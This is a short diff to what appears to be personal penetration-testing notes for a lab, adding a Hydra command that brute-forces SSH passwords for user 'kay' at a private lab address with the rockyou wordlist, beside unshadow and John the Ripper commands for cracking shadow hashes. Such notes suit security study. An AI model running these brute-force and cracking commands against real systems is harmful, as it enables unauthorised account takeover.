@@ -11,6 +11,9 @@ https://gtfobins.github.io/  - GTFOBins is a curated list of Unix binaries that 
 # cheat sheets
 https://tmuxcheatsheet.com/
 
+# password brute forcing -- ssh
+hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.188
+
 # unshadow
 unshadow local_passwd local_shadow > unshadowed
 john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
